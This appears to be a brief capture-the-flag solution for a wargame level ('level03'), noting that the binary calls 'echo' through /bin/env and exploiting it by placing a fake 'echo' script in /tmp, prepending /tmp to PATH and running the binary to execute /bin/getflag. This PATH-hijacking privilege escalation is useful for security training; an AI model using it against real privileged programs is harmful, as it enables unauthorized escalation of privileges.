Find that binary runs "execve(/bin/env echo "Exploit Me")"

```sh
echo /bin/getflag > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
```


